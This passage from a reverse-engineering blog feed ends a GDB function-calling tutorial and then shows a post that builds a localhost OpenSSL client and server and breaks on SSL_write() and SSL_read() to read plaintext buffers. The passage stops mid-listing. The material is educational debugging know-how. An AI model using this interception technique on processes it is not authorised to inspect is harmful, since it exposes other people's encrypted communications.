<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set *<span style="color:#f92672">(</span>uint8_t *<span style="color:#f92672">)(</span>$person + 0x102<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting <em>is_deceased</em> Field at Offset 0x102<br><br></span>
<p>Once the struct is initialized, we can pass it to the function and print the returned name.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>char *<span style="color:#f92672">)</span>get_person_name<span style="color:#f92672">((</span>uint64_t *<span style="color:#f92672">)</span>$person<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$4 <span style="color:#f92672">=</span> 0x110b3ac2 <span style="color:#e6db74">&#34;Gerald&#34;</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Calling <i>get_person_name(person_t *person)</i> Function<br><br></span>
<p>As a good practice, we will free up our struct in the heap after we are done.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call free<span style="color:#f92672">(</span>$person<span style="color:#f92672">)</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Freeing Struct in Heap Memory<br><br></span>
<h2 id="4-conclusion">4. Conclusion</h2>
<p>Manually invoking functions within GDB opens up an entirely new level of power during debugging and reverse engineering. Whether you&rsquo;re verifying program behavior, modifying runtime values, or analyzing stripped binaries with no symbols, function calls allow for deep insight and control.</p>
<p>We saw how you can:</p>
<ul>
<li>Call functions just like you would in C.</li>
<li>Assign return values to GDB variables.</li>
<li>Pass struct pointers by manually crafting memory layout, even without debug symbols.</li>
</ul>
<p>These techniques are especially useful in situations where:</p>
<ul>
<li>You&rsquo;re dealing with stripped binaries.</li>
<li>You need to simulate program flow or reconstruct missing behavior.</li>
<li>You want to dynamically patch or inspect runtime behavior with minimal friction.</li>
</ul>
<p>Understanding how to construct valid arguments and call functions correctly allows you to turn GDB from a passive observer into an active debugger. This knowledge can also serve as the foundation for scripting more powerful automation through Python GDB extensions or agents.</p>
<p>That&rsquo;s all for today! Happy reversing. 🤓</p>
<h2 id="5-resources">5. Resources</h2>
<ol>
<li><a href="/posts/gdb-guides/gdb-guide-part8-invoking-function-calls/resources/gdb_invoke_function.c">gdb_invoke_function.c</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Sniffing SSL Connections in Memory</title>
            <link>https://mathscantor.github.io/posts/sniffing-ssl-connections-in-memory/</link>
            <pubDate>Mon, 23 Jun 2025 22:09:56 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/sniffing-ssl-connections-in-memory/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Hey y&amp;rsquo;all! It&amp;rsquo;s been a while since I posted anything in my blog due to my busy work schedule, and just a teensy-weeny bit of burnout 🤪.&lt;/p&gt;
&lt;p&gt;Today, I thought it would be interesting to share a simple technique to inspect SSL connections in a process&amp;rsquo;s memory. In particular, we will be targeting OpenSSL&amp;rsquo;s library functions, &lt;em&gt;SSL_read()&lt;/em&gt; and &lt;em&gt;SSL_write()&lt;/em&gt;, in order to read its plaintext buffer.&lt;/p&gt;
&lt;h2 id=&#34;2-preparing-the-experiment&#34;&gt;2. Preparing the Experiment&lt;/h2&gt;
&lt;p&gt;To demonstrate this technique, we will need to prepare a client and a server written in C. (See Listings 1 and 2)&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Hey y&rsquo;all! It&rsquo;s been a while since I posted anything in my blog due to my busy work schedule, and just a teensy-weeny bit of burnout 🤪.</p>
<p>Today, I thought it would be interesting to share a simple technique to inspect SSL connections in a process&rsquo;s memory. In particular, we will be targeting OpenSSL&rsquo;s library functions, <em>SSL_read()</em> and <em>SSL_write()</em>, in order to read its plaintext buffer.</p>
<h2 id="2-preparing-the-experiment">2. Preparing the Experiment</h2>
<p>To demonstrate this technique, we will need to prepare a client and a server written in C. (See Listings 1 and 2)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;openssl/ssl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;openssl/err.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HOST &#34;127.0.0.1&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PORT 4443
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_openssl</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SSL_load_error_strings</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">OpenSSL_add_ssl_algorithms</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">cleanup_openssl</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">EVP_cleanup</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SSL_CTX <span style="color:#f92672">*</span><span style="color:#a6e22e">create_context</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> SSL_METHOD <span style="color:#f92672">*</span>method;
</span></span><span style="display:flex;"><span>    SSL_CTX <span style="color:#f92672">*</span>ctx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    method <span style="color:#f92672">=</span> <span style="color:#a6e22e">TLS_client_method</span>();
</span></span><span style="display:flex;"><span>    ctx <span style="color:#f92672">=</span> <span style="color:#a6e22e">SSL_CTX_new</span>(method);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ctx) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Unable to create SSL context&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ERR_print_errors_fp</span>(stderr);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ctx;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sock;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in addr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">1024</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">init_openssl</span>();
</span></span><span style="display:flex;"><span>    SSL_CTX <span style="color:#f92672">*</span>ctx <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_context</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>    addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(PORT);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inet_pton</span>(AF_INET, HOST, <span style="color:#f92672">&amp;</span>addr.sin_addr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">connect</span>(sock, (<span style="color:#66d9ef">struct</span> sockaddr<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr, <span style="color:#66d9ef">sizeof</span>(addr));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    SSL <span style="color:#f92672">*</span>ssl <span style="color:#f92672">=</span> <span style="color:#a6e22e">SSL_new</span>(ctx);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SSL_set_fd</span>(ssl, sock);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">SSL_connect</span>(ssl) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ERR_print_errors_fp</span>(stderr);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello from client!&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">SSL_write</span>(ssl, msg, <span style="color:#a6e22e">strlen</span>(msg));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> bytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">SSL_read</span>(ssl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>        buf[bytes] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Received: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SSL_free</span>(ssl);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(sock);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SSL_CTX_free</span>(ctx);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cleanup_openssl</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Simple SSL Client - ssl_client.c<br><br></span>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;openssl/ssl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;openssl/err.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PORT 4443
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_openssl</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SSL_load_error_strings</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">OpenSSL_add_ssl_algorithms</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">cleanup_openssl</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">EVP_cleanup</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SSL_CTX <span style="color:#f92672">*</span><span style="color:#a6e22e">create_context</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> SSL_METHOD <span style="color:#f92672">*</span>method;
</span></span><span style="display:flex;"><span>    SSL_CTX <span style="color:#f92672">*</span>ctx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    method <span style="color:#f92672">=</span> <span style="color:#a6e22e">TLS_server_method</span>(); <span style="color:#75715e">// for TLS server
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ctx <span style="color:#f92672">=</span> <span style="color:#a6e22e">SSL_CTX_new</span>(method);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ctx) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Unable to create SSL context&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ERR_print_errors_fp</span>(stderr);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ctx;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">configure_context</span>(SSL_CTX <span style="color:#f92672">*</span>ctx) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Load certificate and private key
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">SSL_CTX_use_certificate_file</span>(ctx, <span style="color:#e6db74">&#34;cert.pem&#34;</span>, SSL_FILETYPE_PEM) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">SSL_CTX_use_PrivateKey_file</span>(ctx, <span style="color:#e6db74">&#34;key.pem&#34;</span>, SSL_FILETYPE_PEM) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ERR_print_errors_fp</span>(stderr);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sock;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in addr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">1024</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> bytes;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">init_openssl</span>();
</span></span><span style="display:flex;"><span>    SSL_CTX <span style="color:#f92672">*</span>ctx <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_context</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">configure_context</span>(ctx);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>    addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(PORT);
</span></span><span style="display:flex;"><span>    addr.sin_addr.s_addr <span style="color:#f92672">=</span> INADDR_ANY;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bind</span>(sock, (<span style="color:#66d9ef">struct</span> sockaddr<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr, <span style="color:#66d9ef">sizeof</span>(addr));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">listen</span>(sock, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Server listening on port %d...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, PORT);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in client_addr;
</span></span><span style="display:flex;"><span>    uint len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(client_addr);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> client <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(sock, (<span style="color:#66d9ef">struct</span> sockaddr<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>client_addr, <span style="color:#f92672">&amp;</span>len);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    SSL <span style="color:#f92672">*</span>ssl <span style="color:#f92672">=</span> <span style="color:#a6e22e">SSL_new</span>(ctx);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SSL_set_fd</span>(ssl, client);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">SSL_accept</span>(ssl) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ERR_print_errors_fp</span>(stderr);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        bytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">SSL_read</span>(ssl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>        buf[bytes] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Received: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">SSL_write</span>(ssl, buf, <span style="color:#a6e22e">strlen</span>(buf)); <span style="color:#75715e">// echo back
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SSL_free</span>(ssl);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(client);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(sock);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SSL_CTX_free</span>(ctx);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cleanup_openssl</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Simple SSL Server - ssl_server.c<br><br></span>
<p>The server will also require a private key and a certificate generated with <em>openssl</em>. (See Listing 3)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days <span style="color:#ae81ff">365</span> -nodes
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Generating OpenSSL Private Key and Certificate<br><br></span>
<p>Next, install the OpenSSL development libraries before compiling the client and server. (See Listing 4)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install libssl-dev
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Installing OpenSSL Development Library<br><br></span>
<p>Lastly, compile both the client and the server. (See Listing 5)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc ssl_server.c -o ssl_server -lssl -lcrypto
</span></span><span style="display:flex;"><span>$ gcc ssl_client.c -o ssl_client -lssl -lcrypto
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Compiling SSL Client and Server<br><br></span>
<p>Now, run the server before the client. If everything is working as intended, the server will receive the client&rsquo;s message and echo it back to the client.</p>
<p><img src="/posts/sniffing-ssl-connections-in-memory/images/simple_test.png" alt="simple_test"></p>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="figure">Server and Client SSL Message Exchange<br><br></span>
<h2 id="3-inspecting-buffer-in-client">3. Inspecting Buffer in Client</h2>
<p>To capture the plaintext buffer before it is encrypted, we just have to print the buffer right at the start of <em>SSL_write()</em>! Simple, isn&rsquo;t it?</p>
<p>Start the server first, then attach to the client using <em>gdb</em>. (See Listing 6)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ssl_client
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attach to <em>ssl_client</em> with <em>gdb</em><br><br></span>
<p>Next, we will set a breakpoint at the start of SSL_write before running the binary. (See Listing 7)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b SSL_write
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting Breakpoint @ <em>SSL_write()</em><br><br></span>
<p>Once the breakpoint is hit, print the value of the second argument to SSL_write(). In my case, I am using the x86_64 architecture in Linux and therefore, the 2nd argument of <em>SSL_write()</em> refers to the <em>RSI</em> register. (See Listing 8)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers rsi
</span></span><span style="display:flex;"><span>rsi            0x82205b            <span style="color:#ae81ff">8527963</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Inspecting Value of <em>RSI</em> Register<br><br></span>
<p>The value of <em>RSI</em> shown in the previous listing refers to the address of the buffer / the pointer to the string in plaintext. Inspecting the plaintext buffer is straightforward from here. (See Listing 9)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s $rsi
</span></span><span style="display:flex;"><span>0x82205b:	<span style="color:#e6db74">&#34;Hello from client!&#34;</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Printing Plaintext Buffer<br><br></span>
<h2 id="4-inspecting-buffer-in-server">4. Inspecting Buffer in Server</h2>
<p>Now that we&rsquo;ve captured the plaintext message on the client side, let’s do the same on the server.
This time, however, we will require two breakpoints within <em>SSL_read()</em>.</p>
<p>Firstly, attach to the server with <em>gdb</em>. (See Listing 10)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ssl_server
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attach GDB to <em>ssl_server</em><br><br></span>
<p>Set a breakpoint at the start of <em>SSL_read()</em> before running the server. (See Listing 11)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b SSL_read
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting Breakpoint @ <em>SSL_read()</em><br><br></span>
<p>Upon hitting the breakpoint (by running our client), we save the address stored in the <em>RSI</em> register for later reference. (See Listing 12)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Hit Breakpoint 1 (SSL_read)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $buf <span style="color:#f92672">=</span> $rsi
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Saving Buffer Address for Reference<br><br></span>
<p>Since the plaintext will be written to the buffer at the end of <em>SSL_read()</em>, we set a breakpoint at the <code>ret</code> instruction. Thus, we need to find the offset where this instruction occurs by reading its disassembly. In my case, this occurs at <code>SSL_read + 74</code>. (See Listing 13)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(gdb) disass SSL_read
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00007ffff7f3a5fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;:</span>	ret
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Finding Offset of Return Instruction<br><br></span>
<p>After setting a 2nd breakpoint on the return instruction, resume the execution of the server. (See Listing 14)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b *<span style="color:#f92672">(</span>SSL_read + 74<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> <span style="color:#66d9ef">continue</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting Breakpoint @ <em>SSL_read()</em> + 74 &amp; Resuming Execution<br><br></span>
<p>When we hit our 2nd breakpoint, we can read the plaintext string from our buffer address saved earlier. (See Listing 15)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Hit Breakpoint 2 (SSL_read + 74)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s $buf
</span></span><span style="display:flex;"><span>0x7fffffffd860:	<span style="color:#e6db74">&#34;Hello from client!&#34;</span>
